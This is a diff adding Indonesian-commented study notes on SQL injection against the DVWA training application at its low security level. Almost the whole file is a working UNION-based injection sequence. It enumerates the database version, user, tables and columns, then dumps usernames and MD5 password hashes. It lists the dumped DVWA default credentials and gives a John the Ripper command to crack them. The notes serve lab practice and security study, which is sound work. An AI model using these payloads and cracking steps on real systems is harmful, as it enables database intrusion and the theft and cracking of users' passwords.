@@ -1,6 +1,41 @@
+# Check apakah bisa di inject
+1' or '2'='2
 %' or '0'='0
+
+# Untuk menampilkan versi MySQL dan server
 %' or 0=0 union select null, version() #
+
+# Untuk menampilkan user yang digunakan untuk login ke MySQL
 %' or 0=0 union select null, user() #
+
+# Untuk menampilkan database yang digunakan
 %' or 0=0 union select null, database() #
+
+# Untuk menampilkan keseluruhan tables pada MySQL
 %' and 1=0 union select null, table_name from information_schema.tables #
+
+# Untuk seleksi tables yang mengindikasikan user
 %' and 1=0 union select null, table_name from information_schema.tables where table_name like 'user%'#
+
+# Untuk menampilkan isian table (struktur data) dari tabel users
+%' and 1=0 union select null, concat(table_name,0x0a,column_name) from information_schema.columns where table_name = 'users' #
+
+# Untuk menampilkan isian dari kolom password yang ada pada table user
+# 0x0a / \n untuk membuat garis baru
+%' and 1=0 union select null, concat(first_name,0x0a,last_name,0x0a,user,0x0a,password) from users #
+
+-----------------------------------------------------------------------------------------------------------------------------------
+Uname & Password DVWA SQL Injection Low Level
+
+admin:5f4dcc3b5aa765d61d8327deb882cf99
+gordonb:e99a18c428cb38d5f260853678922e03
+1337:8d3533d75ae2c3966d7e0d4fcc69216b
+pablo:0d107d09f5bbe40cade3de5c71e9e9b7
+smithy:5f4dcc3b5aa765d61d8327deb882cf99 
+
+------------------------------------------------------------------------------------------------------------------------------------
+
+- jadikan list Uname dan Pass ke dalam sebuah file
+
+- crack password menggunakan john
+./john --format=raw-MD5 dvwa_password.txt
